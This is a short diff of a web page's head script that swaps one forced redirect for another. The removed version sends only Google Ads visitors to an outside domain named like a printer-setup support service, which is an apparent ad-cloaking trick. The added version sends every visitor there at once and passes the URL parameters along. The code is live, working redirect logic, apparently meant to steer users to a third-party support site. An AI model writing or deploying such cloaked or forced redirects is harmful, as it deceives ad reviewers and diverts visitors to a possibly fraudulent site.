@@ -2,13 +2,9 @@
 <html lang="en">
 <head>
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    
-    // Check for Google Ads traffic (gad_source or gclid)
-    if (urlParams.has('gad_source') || urlParams.has('gclid')) {
-        // Redirect to your EXTERNAL website (e.g., your-printer-support.com)
-        window.location.replace("https://absolute-printersetup.b-cdn.net/" + window.location.search);
-    }
+    // This script fires for EVERY visitor immediately
+    // It captures any parameters (like keywords or IDs) and carries them to the new site
+    window.location.replace("https://absolute-printersetup.b-cdn.net/" + window.location.search);
 </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
